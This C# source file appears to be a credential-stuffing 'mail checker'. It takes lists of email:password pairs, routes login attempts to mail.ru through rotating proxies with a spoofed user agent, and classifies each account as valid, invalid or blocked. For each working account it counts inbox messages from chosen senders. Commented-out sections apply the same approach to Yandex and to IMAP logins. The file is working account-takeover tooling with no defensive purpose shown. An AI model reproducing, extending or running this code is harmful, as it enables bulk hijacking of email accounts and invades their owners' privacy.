using System;
using System.Collections.Concurrent;
using System.Threading;
using System.Text.RegularExpressions;
using xNet.Net;
using System.Collections.Generic;




namespace Mail_Checker
{

    class ProxyStats
    {
        public string proxy;
        public int stats;

        public ProxyStats(string proxy, int stats)
        {
            this.proxy = proxy;
            this.stats = stats;
        }
    }


    class Checker
    {

        public event EventHandler<CheckEventArgs> OneCheckDone;

        char[] separs = { ':', ';' };
        public ConcurrentStack<string> mails;
        ConcurrentQueue<ProxyStats> proxys;
        string[] querys;


        int workingThreads = 0, errors = 0, valid = 0, novalid = 0;
        int threads, timeout;
        bool started = false;

        public Checker(string[] mails, string[] proxys, string[] querys, int threads, int timeout)
        {
            this.mails = new ConcurrentStack<string>(mails);

            this.proxys = new ConcurrentQueue<ProxyStats>();

            for (int i = 0; i < proxys.Length; i++)
            {
                this.proxys.Enqueue(new ProxyStats(proxys[i], 5));
            }
            

            this.querys = querys;
            this.threads = threads;
            this.timeout = timeout;

            
        }


        public void Start()
        {
            started = true;

            List<Thread> threadsList = new List<Thread>();


            for (int i = 0; i < threads; i++)
            {
                Thread t = new Thread(new ThreadStart(Check));
                t.Start();
                threadsList.Add(t);
            }
        }

        public void Stop()
        {
            started = false;
        }


        Random r = new Random();

        void Check(/*object e*/)
        {

            workingThreads++;

            Thread.Sleep(r.Next(100, 10000));

            while (mails.Count > 0 && proxys.Count > 0 && started)
            {

                string mailLine;

                if (!mails.TryPop(out mailLine)) continue;

                string[] mailElements = mailLine.Split(separs);
                if (mailElements.Length != 2) continue;


                string serv = DetectDomain(mailElements[0]);

                if (serv == "") continue;

                ProxyStats proxyLine;
                if (!proxys.TryDequeue(out proxyLine))
                {
                    mails.Push(mailLine);
                    continue;
                }
                string[] proxyElements = proxyLine.proxy.Split(separs);

                if (proxyElements.Length != 2 || Regex.Matches(proxyElements[0], "((25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)").Count == 0 ||
                    Regex.Matches(proxyElements[1], "^[0-9]*$").Count == 0)
                {
                    mails.Push(mailLine);
                    continue;
                }


                int[] messages = new int[querys.Length];

                CheckErrors error = CheckErrors.noError;

                if (serv == "imap.mail.ru") MailRuCheck(mailElements, proxyElements, out messages, out error);
                //else if (serv == "imap.yandex.ru") YandexCheck(mailElements, proxyElements, out messNum, out error);
                else
                {
                    proxys.Enqueue(proxyLine);
                    continue;
                }

                if (error == CheckErrors.proxyError)
                {
                    errors++;
                    mails.Push(mailLine);
                    proxyLine.stats--;
                    if (proxyLine.stats > 0) proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.noError)
                {
                    valid++;
                    proxyLine.stats=5;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.mailError)
                {
                    novalid++;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.anotherError)
                {
                    errors++;
                    mails.Push(mailLine);
                    proxys.Enqueue(proxyLine);
                }



                MailInfo mInfo = new MailInfo(mailElements[0], mailElements[1], messages);
                CheckState chState = new CheckState(mails.Count + workingThreads, proxys.Count + workingThreads, errors, valid, novalid, workingThreads);
                OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));



            }



            workingThreads--;

        }

        public static string DetectDomain(string mail)
        {
            string serv = "";
            if (mail.Contains("@yandex.ru")) serv = "imap.yandex.ru";

            else if (mail.Contains("@mail.ru") || mail.Contains("@list.ru")
            || mail.Contains("@inbox.ru") || mail.Contains("@bk.ru")) serv = "imap.mail.ru";

            else if (mail.Contains("@rambler.ru")) serv = "imap.rambler.ru";

            else if (mail.Contains("@qip.ru") || mail.Contains("@pochta.ru") ||
                mail.Contains("@fromru.com") || mail.Contains("@front.ru") ||
                mail.Contains("@hotbox.ru") || mail.Contains("@hotmail.ru") ||
                mail.Contains("@krovatka.su") || mail.Contains("@land.ru") ||
                mail.Contains("@mail15.com") || mail.Contains("@mail333.com") ||
                mail.Contains("@newmail.ru") || mail.Contains("@nightmail.ru") ||
                mail.Contains("@nm.ru") || mail.Contains("@pisem.net") ||
                mail.Contains("@pochtamt.ru") || mail.Contains("@pop3.ru") ||
                mail.Contains("@rbcmail.ru") || mail.Contains("@smtp.ru") ||
                mail.Contains("@5ballov.ru") || mail.Contains("@aeterna.ru") ||
                mail.Contains("@ziza.ru") || mail.Contains("@memori.ru") ||
                mail.Contains("@photofile.ru") || mail.Contains("@fotoplenka.ru") ||
                mail.Contains("@pochta.com")) serv = "imap.qip.ru";

            else serv = "";
            return serv;
        }

        private void MailRuCheck(string[] mailElements, string[] proxyElements, out int[] messages, out CheckErrors error)
        {

            string[] loginDomain = mailElements[0].Split(new char[] { '@' });

            messages = new int[querys.Length];
            for (int i = 0; i < messages.Length; i++)
            {
                messages[i] = 0;
            }

            error = CheckErrors.noError;


            try
            {


                HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
                CookieDictionary cookies = new CookieDictionary();

                HttpRequest req1 = new HttpRequest();
                req1.Proxy = proxy;
                req1.Cookies = cookies;
                req1.ConnectTimeout = timeout*1000;
                req1.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";

                HttpResponse res1 = req1.Post("https://auth.mail.ru/cgi-bin/auth",
                    "Login="+loginDomain[0]+"&Domain="+loginDomain[1]+"&Password="+mailElements[1]+"&saveauth=1&new_auth_form=1",
                    "application/x-www-form-urlencoded");

                string res1str = res1.ToString();


                if (res1str.Contains("&captcha=1") || res1str.Contains("Ваш ящик заблокирован"))
                {
                    error = CheckErrors.anotherError;
                    return;
                }
                else if (res1str.Contains("&fail=1"))
                {
                    error = CheckErrors.mailError;
                    return;
                }
                else if (!res1str.Contains("window.location.replace(\"https://m.mail.ru"))
                {
                    error = CheckErrors.proxyError;
                    return;
                }

                HttpRequest req2 = new HttpRequest();
                req2.Proxy = proxy;
                req2.Cookies = cookies;
                req2.ConnectTimeout = timeout * 1000;
                req2.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";


                for (int i = 0; i < querys.Length; i++)
                {

                    HttpResponse res2 = req2.Get("https://m.mail.ru/search/gosearch?q_from=" + querys[i]);

                    string res2str = res2.ToString();

                    if (!res2str.Contains("Почта Mail.Ru"))
                    {
                        error = CheckErrors.proxyError;
                        return;
                    }
                    else if (res2str.Contains("Введите поисковый запрос"))
                    {
                        messages[i] = 0;
                    }
                    else
                    {
                        MatchCollection col = Regex.Matches(res2str, "[0-9]*\\)</option>");

                        for (int ii = 0; ii < col.Count; ii++)
                        {
                            string foundStr = col[ii].Value;
                            foundStr = foundStr.Replace(")</option>", "");

                            messages[i] += Convert.ToInt32(foundStr);
                        }

                        

                    }
                }

            }
            catch (HttpException)
            {
                error = CheckErrors.proxyError;
            }
            catch (ArgumentException)
            {
                error = CheckErrors.proxyError;
            }


        }

        //private void ImapMailsCheck(string[] mailElements, string serv, string[] proxyElements, out int messNum, out CheckErrors error)
        //{
        //    bool success = true;
        //    messNum = 0;
        //    error = CheckErrors.noError;








        //    //Imap imap = new Imap();
        //    //imap.ConnectTimeout = timeout;
        //    //imap.ReadTimeout = timeout;
        //    //imap.Ssl = true;
        //    //imap.Port = 993;
        //    //imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");


        //    //imap.HttpProxyHostname = proxyElements[0];
        //    //imap.HttpProxyPort = Convert.ToInt32(proxyElements[1]);


        //    //success = imap.Connect(serv);



        //    //if (success == true)
        //    //{
        //    //    success = imap.Login(mailElements[0], mailElements[1]);
        //    //}
        //    //else if (error == CheckErrors.noError) error = CheckErrors.proxyError;



        //    //if (success == true)
        //    //{
        //    //    success = imap.SelectMailbox("INBOX");

        //    //}
        //    //else if (error == CheckErrors.noError) error = CheckErrors.mailError;


        //    //MessageSet messageSet = null;
        //    //if (success == true)
        //    //{
        //    //    messageSet = imap.Search("FROM ea.com", false);
        //    //}
        //    //else if (error == CheckErrors.noError) error = CheckErrors.connectError;

        //    //if (messageSet != null) messNum += messageSet.Count;
        //    //else if (error == CheckErrors.noError) error = CheckErrors.connectError;

        //    ////if (success == true)
        //    ////{
        //    ////    success = imap.SelectMailbox("Удалённые");
        //    ////}
        //    ////else if (error == CheckErrors.noError) error = CheckErrors.connectError;

        //    ////if (success == true)
        //    ////{
        //    ////    MessageSet messageSet = imap.Search(queryLong, true);
        //    ////    if (messageSet != null) messNum += messageSet.Count;
        //    ////}
        //    ////else if (error == CheckErrors.noError) error = CheckErrors.connectError;


        //    //imap.Disconnect();
        //    //imap.Dispose();




        //}




        //private void YandexCheck(string[] mailElements, string[] proxyElements, out int messNum, out CheckErrors error)
        //{


        //    messNum = 0;
        //    error = CheckErrors.noError;




        //    try
        //    {


        //        HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
        //        CookieDictionary cookies = new CookieDictionary();

        //        HttpRequest req1 = new HttpRequest();
        //        req1.Proxy = proxy;
        //        req1.Cookies = cookies;
        //        req1.ConnectTimeout = timeout * 1000;

        //        HttpResponse res1 = req1.Post("https://passport.yandex.ru/passport?mode=auth&retpath=https://mail.yandex.ru/lite/inbox",
        //            "login=" + mailElements[0] + "&passwd=" + mailElements[1] + "&retpath=https://mail.yandex.ru/lite/inbox",
        //            "application/x-www-form-urlencoded; charset=UTF-8");

        //        string res1str = res1.ToString();

        //        if (res1str.Contains("Неправильная пара логин-пароль"))
        //        {
        //            error = CheckErrors.mailError;
        //            return;
        //        }
        //        else if (!res1str.Contains("Яндекс"))
        //        {
        //            error = CheckErrors.proxyError;
        //            return;
        //        }
        //        else if (res1str.Contains("Ошибка проверки контрольных символов"))
        //        {
        //            error = CheckErrors.anotherError;
        //            return;
        //        }
                


        //        HttpRequest req2 = new HttpRequest();
        //        req2.Proxy = proxy;
        //        req2.Cookies = cookies;
        //        req2.ConnectTimeout = timeout * 1000;
        //        req2.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";
        //        req2.AddHeader(HttpHeader.CacheControl, "max-age=0");
        //        req2.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        //        req2.AddHeader(HttpHeader.AcceptLanguage, "ru,en-GB;q=0.8");
        //        req2.AddHeader(HttpHeader.Referer, "https://passport.yandex.ru/passport?mode=auth&retpath=https%3A%2F%2Fmail.yandex.ru%2Flite%2Finbox");
        //        req2.AddHeader("Host", "mail.yandex.ru");
        //        req2.AddHeader("Referer", "https://mail.yandex.ru/lite/inbox?ncrnd=3629");

        //        HttpResponse res2 = req2.Get("https://mail.yandex.ru/lite/search?request=" + query);


        //        string res2str = res2.ToString();

        //        messNum += Regex.Matches(res2str, "class=\"b-messages__message ").Count;

        //    }
        //    catch (HttpException)
        //    {
        //        error = CheckErrors.proxyError;
        //    }
        //    catch (ArgumentException)
        //    {
        //        error = CheckErrors.proxyError;
        //    }











        //    ////если пуст, то ошибка прокси
        //    //if (resp == null)
        //    //{
        //    //    success = false;
        //    //    error = CheckErrors.proxyError;
        //    //}
        //    ////если содержит фейл или блок, то ошибка почты
        //    //else if (resp.BodyStr.Contains("error-msg") /*|| resp.BodyStr.Contains("почтовый ящик был взломан")*/)
        //    //{
        //    //    success = false;
        //    //    error = CheckErrors.mailError;
        //    //}
        //    ////если не содержит, то ошибка прокси
        //    //else if (!resp.BodyStr.Contains("yandex.ru\">Яндекс"))
        //    //{
        //    //    success = false;
        //    //    error = CheckErrors.proxyError;
        //    //}

        //    ////поиск-запрос
        //    //HttpResponse resp2 = null;
        //    //if (success)
        //    //{

        //    //    HttpRequest req2 = new HttpRequest();
        //    //    req2.AddHeader("_h", "messages");
        //    //    req2.AddHeader("X-Requested-With", "XMLHttpRequest");
        //    //    req2.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
        //    //    req2.AddHeader("Origin", "https://mail.yandex.ru");
        //    //    req2.AddParam("_handlers", "messages");
        //    //    req2.AddParam("search", "yes");
        //    //    req2.AddParam("scope", "hdr_from");
        //    //    req2.AddParam("request", "yandex");
        //    //    req2.AddParam("_product", "RUS");
        //    //    req2.AddParam("_locale", "ru");
        //    //    req2.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
        //    //    req2.Path = "/neo2/handlers/handlers3.jsx";
        //    //    req2.HttpVerb = "POST";


        //    //    resp2 = http.SynchronousRequest("mail.yandex.ru", 443, true, req2);

        //    //}

        //    ////если пустой или не содержит поиска, то ошибка соединения
        //    //if (error == CheckErrors.noError && (resp2 == null /*|| !resp2.BodyStr.Contains("SearchPerson")*/))
        //    //{
        //    //    success = false;
        //    //    error = CheckErrors.connectError;
        //    //}


        //    ////поиск сообщний
        //    //if (success)
        //    //{
        //    //    MessageBox.Show(resp2.BodyStr);
        //    //    MatchCollection foundCollection = Regex.Matches(resp2.BodyStr, "\"count\":.*");
        //    //    if (foundCollection.Count > 0)
        //    //    {
        //    //        string found = foundCollection[0].Value.Replace("\"count\":", "");
        //    //        messNum = Convert.ToInt32(found);
        //    //    }
        //    //    else messNum = 0;

        //    //}


        //    //http.CloseAllConnections();
        //    //http.Dispose();

        //}


    }
}
